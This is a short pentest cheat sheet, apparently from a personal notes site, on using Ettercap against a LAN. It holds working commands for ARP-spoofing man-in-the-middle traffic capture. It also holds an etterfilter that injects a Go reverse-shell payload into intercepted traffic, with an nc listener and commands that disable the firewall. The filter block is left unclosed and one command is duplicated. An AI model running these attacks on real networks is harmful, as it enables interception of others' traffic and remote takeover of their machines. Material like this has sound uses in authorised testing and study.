---
title: Ettercap
desc: Man-in-the-middle attacks on a LAN.
tags: [ARPSpoofing, Network]
alts: []
website:
render_with_liquid: false
---

## Establish MITM - ARP Spoofing

```sh
# On target machine

# -T: text only GUI
# -M: man-in-the-middle attack
# -w: write .pcap file
ettercap -T -i eth1 -M arp -w /tmp/ettercap.pcap
ettercap -T -i eth1 -M arp -w /tmp/ettercap.pcap

# --------------------------------------------------------

# On attack machine

# Transfer the ettercap output file
scp victim@<target-ip>:/tmp/ettercap.pcap .

# Investigate the file
wireshark ettercap.pcap
```

<br />

## Reverse Shell via ARP Spoofing

```sh
# On target machine

# Create whoami.ecf - use Golang payload for reverse shell
if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami")) {
	log(DATA.data, "/root/ettercap.log");
	replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"<target-eth1-ip>:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &");
	msg("###### ETTERFILTER: substituted 'whoami' with reverse shell.  ######\n");

# Compile the file using etterfilter
etterfilter whoami.ecf -o whoami.ef

# Open listener on background
nc -lvnp 6666 &

# Disable Firewall for incoming connection
ufw allow in on eth1 from <target-ip> to <target-eth1-ip> port 6666 proto tcp
# or
ufw disable

# Run ettercap
# -F: Filter
ettercap -T -i eth1 -M arp -F whoami.ef

# Seeing outputs, we should see "Connection received on <target-ip>", 
# Quit ettercap with "q" and foreground the listener with "fg".
# Then we can interact with target shell.
```